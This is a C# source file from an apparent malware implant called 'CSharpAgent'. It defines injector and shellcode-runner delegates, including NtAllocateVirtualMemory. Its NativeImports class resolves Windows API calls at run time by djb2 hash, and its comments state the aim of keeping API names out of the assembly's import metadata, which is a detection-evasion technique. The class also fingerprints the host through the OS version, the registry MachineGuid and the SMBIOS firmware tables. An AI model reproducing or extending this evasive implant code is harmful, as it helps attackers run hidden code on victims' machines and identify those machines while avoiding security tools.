using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    [StructLayout(LayoutKind.Sequential)]
    internal struct SYSTEM_INFO
    {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct OSVERSIONINFOW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate IntPtr GetTEBDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int EntryDelegate(ulong injectorVersion);

    internal static class NativeImports
    {
        // NOTE (audit No.21): the ladder stripped the static P/Invoke surface rung by rung —
        // rung 1 took VirtualProtect + FlushInstructionCache (kernel32), rung 2 took
        // RtlGetVersion (ntdll), rung 3 took the three Identity probes below (kernel32 +
        // advapi32). NOTHING is imported statically anymore: every native entry point is
        // resolved at call time from the live export tables by hash, so no API name rides
        // the assembly's metadata.

        // --- Dynamic-resolution core (audit No.21) --------------------------------------
        // Managed module lookup — the base address every hash resolve starts from. NO
        // GetModuleHandle import: System.dll (already the single reference) enumerates the
        // process's own modules, and a WOW64 process lists its 32-bit DLLs — the ones this
        // code can actually call — so bitness always matches the process.
        internal static IntPtr ModuleBase(string lowerName)
        {
            var modules = System.Diagnostics.Process.GetCurrentProcess().Modules;
            for (var i = 0; i < modules.Count; i++)
                if (string.Compare(modules[i].ModuleName, lowerName, true) == 0)
                    return modules[i].BaseAddress;
            return IntPtr.Zero;
        }

        // One resolve step for the whole ladder (audit No.21): module base by name + export
        // by hash, both zero-checked. Throws into the caller's containment on failure —
        // Identity's probes degrade to their fallbacks, the injector replies status 1.
        internal static IntPtr ResolveExport(string lowerModule, uint eHash)
        {
            var module = ModuleBase(lowerModule);
            if (module == IntPtr.Zero)
                throw new InvalidOperationException(lowerModule + " is not in the process module list");
            var proc = ShellcodeRunner.GetProcAddressByHash(module, eHash);
            if (proc == IntPtr.Zero)
                throw new InvalidOperationException(lowerModule + " export hash did not resolve");
            return proc;
        }

        // Truthful OS version (Environment.OSVersion inherits the host manifest's
        // compatibility lies on Windows 8.1+) — resolved at call time from the live ntdll
        // export table by hash instead of a static import (audit No.21, rung 2): the API
        // name never rides the import table. The caller (Identity's OS probe) already
        // degrades to Environment.OSVersion if this throws. Returns 0 on success.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int OsVersionFn(ref OSVERSIONINFOW versionInfo);
        private static OsVersionFn _osVersion;

        internal static int GetOsVersion(ref OSVERSIONINFOW versionInfo)
        {
            if (_osVersion == null)
                _osVersion = (OsVersionFn)Marshal.GetDelegateForFunctionPointer(
                    ResolveExport("ntdll.dll", 1070062793), typeof(OsVersionFn)); // djb2(77777) "rtlgetversion"
            return _osVersion(ref versionInfo);
        }

        // Machine/system snapshot — WOW64-proof (the JScript agent takes the WMI CPU
        // Architecture code; the native call is its equivalent). Rung 3: resolved at call
        // time from the live kernel32 export table; the Identity probe falls back to the
        // PROCESSOR_ARCHITECTURE env vars if this throws.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void SystemInfoFn(out SYSTEM_INFO lpSystemInfo);
        private static SystemInfoFn _systemInfo;

        internal static void ReadSystemInfo(out SYSTEM_INFO lpSystemInfo)
        {
            if (_systemInfo == null)
                _systemInfo = (SystemInfoFn)Marshal.GetDelegateForFunctionPointer(
                    ResolveExport("kernel32.dll", 889375849), typeof(SystemInfoFn)); // djb2(77777) "getnativesysteminfo"
            _systemInfo(out lpSystemInfo);
        }

        // MachineGuid through the EXPLICIT 32-bit registry view — see Identity.MachineGuid32View.
        // dwFlags = RRF_RT_REG_SZ | RRF_SUBKEY_WOW6432KEY (the call takes its OWN wow64
        // selectors — the KEY_WOW64_*KEY bits belong to RegOpenKeyEx's samDesired and are
        // silently ignored here); returns 0 (ERROR_SUCCESS) on success. The 64-bit view is
        // deliberately never requested: the JScript host can only reach the 32-bit view, so
        // that is the canonical identity source for every breed. Rung 3: resolved at call
        // time from the live advapi32 export table; the probe degrades to "" on a throw.
        // NOTE the W-suffixed hash: the old CharSet.Unicode import resolved RegGetValueW
        // (the loader appends the suffix) — the unsuffixed name has no export to match.
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int RegistryValueFn(
            IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags,
            out uint pdwType, byte[] pvData, ref uint pcbData);
        private static RegistryValueFn _registryValue;

        internal static int ReadRegistryValue(
            IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags,
            out uint pdwType, byte[] pvData, ref uint pcbData)
        {
            if (_registryValue == null)
                _registryValue = (RegistryValueFn)Marshal.GetDelegateForFunctionPointer(
                    ResolveExport("advapi32.dll", 1657873475), typeof(RegistryValueFn)); // djb2(77777) "reggetvaluew"
            return _registryValue(hkey, lpSubKey, lpValue, dwFlags, out pdwType, pvData, ref pcbData);
        }

        // Raw SMBIOS tables ('RSMB') for the UUID fallback — the same value the JScript agent's
        // Win32_ComputerSystemProduct fallback yields, read without a WMI dependency. Returns
        // the required buffer size when called with a null buffer. Rung 3: resolved at call
        // time from the live kernel32 export table.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint FirmwareTableFn(
            uint firmwareTableProviderSignature, uint firmwareTableID,
            byte[] firmwareTableBuffer, uint size);
        private static FirmwareTableFn _firmwareTable;

        internal static uint ReadFirmwareTable(
            uint firmwareTableProviderSignature, uint firmwareTableID,
            byte[] firmwareTableBuffer, uint size)
        {
            if (_firmwareTable == null)
                _firmwareTable = (FirmwareTableFn)Marshal.GetDelegateForFunctionPointer(
                    ResolveExport("kernel32.dll", 1604410075), typeof(FirmwareTableFn)); // djb2(77777) "getsystemfirmwaretable"
            return _firmwareTable(firmwareTableProviderSignature, firmwareTableID, firmwareTableBuffer, size);
        }
    }
}
